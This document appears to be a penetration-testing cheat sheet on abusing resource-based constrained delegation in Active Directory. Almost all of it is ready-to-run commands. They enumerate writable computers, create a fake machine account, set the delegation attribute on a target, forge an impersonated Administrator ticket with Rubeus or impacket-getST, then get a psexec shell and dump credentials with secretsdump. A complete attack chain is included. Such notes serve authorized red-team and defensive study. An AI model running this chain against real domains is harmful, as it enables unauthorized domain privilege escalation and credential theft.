---
tags:
  - Active_Directory
  - Advanced
  - Delegation_Abuse
  - Impacket
  - Kerberos
  - Lateral_Movement
  - Privilege_Escalation
  - Rubeus
  - Windows
---

## Resource-Based Constrained Delegation Theory
resources: [HackTricks - RBCD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

> [!info] RBCD flips delegation model - target resource specifies who can delegate TO it. Controlled via **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute.

> [!important] **Requirements:**
> - **GenericWrite**, **GenericAll**, **WriteDacl**, or **WriteOwner** on target computer
> - Ability to create machine account (**MachineAccountQuota** > 0) or control of existing one
> - Network access to target (port 445)

### RBCD vs Traditional Constrained Delegation
> - **Traditional** - Source account lists which SPNs it can delegate TO
> - **RBCD** - Target resource lists which accounts can delegate TO IT

## Enumeration

### BloodHound Queries
```cypher
# Find write access to computers
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p
```

### PowerView Enumeration [Remote]
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { 
  $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" 
}
```

### Check MachineAccountQuota [Remote]
```powershell
Get-ADObject -Identity "DC=<Domain>,DC=<TLD>" -Properties ms-DS-MachineAccountQuota
```

```bash
ldapsearch -x -H ldap://<DC-IP> -D "<User>@<Domain>" -w "<Password>" -b "DC=<Domain>,DC=<TLD>" "(objectClass=domain)" ms-DS-MachineAccountQuota
```

```bash
nxc ldap <DC_IP> -u <User> -p <Pass> -M maq
```

### Find Existing RBCD Configurations [Local]
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

```bash
impacket-findDelegation <Domain>/<User>:<Pass> -dc-ip <DC_IP>
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation
```

## Exploiting RBCD

> [!warning] **Troubleshooting:**
> - **Can't create machine account:** (MAQ = 0): Use existing machine account you control
> - **RBCD write fails:** (No write permission): Verify ACLs in **BloodHound**
> - **getST.py fails:** (S4U issues): Check account types, target must be computer
> - **Ticket doesn't work:** (Wrong SPN or hostname): Use FQDN, verify DNS

### Step 1: Create Computer Account [Remote]
```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

```bash
impacket-addcomputer -computer-name FakeComputer$ -computer-pass 'Password123!' -dc-ip <DC-IP> <Domain>/<User>:<Password>
```

### Step 2: Get New Computer's SID [Remote] [optional]
```powershell
Get-ADComputer FakeComputer | Select-Object SID
```

```bash
impacket-getPac -targetUser FakeComputer$ <Domain>/<User>:<Password>
```

### Step 3: Configure RBCD on Target [Remote]
```powershell
# Using PowerView
$ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TargetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```bash
impacket-rbcd -delegate-to <TargetComputer>$ -delegate-from FakeComputer$ -dc-ip <DC-IP> -action write <Domain>/<User>:<Password>
```

### Step 4: Request Service Ticket [Remote]
```cmd
Rubeus.exe s4u /user:FakeComputer$ /rc4:<FakeComputerNTHash> /impersonateuser:Administrator /msdsspn:cifs/<TargetComputer>.<Domain> /ptt
```

```bash
impacket-getST -spn cifs/<TargetComputer>.<Domain> -impersonate Administrator -dc-ip <DC-IP> <Domain>/FakeComputer$:'Password123!'
```

### Step 5: Access Target [Local]
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TargetComputer>.<Domain>
```

### [Alternate] NetExec with RBCD Module
> [!tip] Automated RBCD attack using **NetExec**.

```bash
nxc smb <TargetIP> -u <User> -p '<Pass>' -M rbcd -o action=write delegate_from=YOURPC$ delegate_to=<TargetComputer>$
```

### Validate Access
```bash
nxc smb <Target> -u Administrator -k --use-kcache
```

```bash
impacket-secretsdump -k -no-pass <Target>
```

## Full Attack Chain (Impacket)
```bash
# Create computer account
impacket-addcomputer -computer-name ATTACK$ -computer-pass 'P@ssw0rd!' -dc-ip <DC-IP> <Domain>/<User>:<Password>

# Configure RBCD
impacket-rbcd -delegate-to <Target>$ -delegate-from ATTACK$ -dc-ip <DC-IP> -action write <Domain>/<User>:<Password>

# Get service ticket
impacket-getST -spn cifs/<Target>.<Domain> -impersonate Administrator -dc-ip <DC-IP> <Domain>/ATTACK$:'P@ssw0rd!'

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <Target>.<Domain>
```

## Cleanup [optional]

### Remove RBCD Configuration
```bash
impacket-rbcd -delegate-to <Target>$ -delegate-from ATTACK$ -dc-ip <DC-IP> -action remove <Domain>/<User>:<Password>
```

```powershell
Set-ADComputer <TargetComputer> -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

### Delete Machine Account
```bash
impacket-addcomputer -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>
```
